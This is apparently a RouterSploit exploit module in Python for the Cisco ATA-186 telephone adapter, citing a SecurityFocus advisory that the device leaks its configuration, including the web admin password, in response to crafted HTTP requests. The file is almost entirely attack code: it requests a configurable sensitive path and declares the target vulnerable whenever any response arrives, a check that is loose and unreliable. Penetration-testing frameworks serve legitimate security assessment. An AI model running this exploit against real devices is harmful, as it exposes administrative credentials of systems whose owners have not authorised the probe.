# -*- coding:utf-8 -*-
# Why didn't add above line in HTTP PoC(s)?!
from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    print_status,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    The Cisco ATA-186 Analog Telephone Adapter is a hardware
    device designed to interface between analog telephones and
    Voice over IP (VoIP). It includes support for web based configuration.
    """
    __info__ = {
        'name': 'Cisco ATA-186 disclose sensitive configuration',
        'description': ['The Cisco ATA-186 Analog Telephone Adapter is a hardware device \n'
                        'designed to interface between analog telephones and Voice over IP \n'
                        '(VoIP). It includes support for web based configuration.\n'
                        'Reportedly, HTTP requests consisting of a single character will \n'
                        'cause the device to disclose sensitive configuration information, \n'
                        'including the password to the administrative web interface.',
                        ],
        'authors': [
            'Patrick Michael Kane'  
        ],
        'references': [
            'https://www.securityfocus.com/bid/4711/info',
        ],
        'devices': [
            'Cisco ATA-186 Analog Telephone Adapter',
        ],
        'id': 'sf-4771'
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1',
                             validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port
    sensitive_path = exploits.Option('dev',
                                     'Path to sensitive config file')
    response = None

    # TODO: UNITEST - FUNC TEST - CASE 06 -- Exploit Test
    def run(self):
        executed = self.check()
        if executed:
            if self.response is None:
                print_error("Target HTTP Service may temporary unavailable!")  # target is not vulnerable
                return False
            else:
                print_success("Target is VULNERABLE!")
                return True
        else:
            print_error("Target may not in suffer")
            return False

    @mute
    def check(self):
        # TODO: UNITEST - FUNC TEST - CASE 05 -- Check func test
        url = "{}:{}/{}".format(self.target, self.port, self.sensitive_path)
        try:
            self.response = http_request(method="GET", url=url)
        except Exception:
            print_status("Something go wrong...Oops")
            return False

        if self.response:
            return True

        return False  # target is not vulnerable
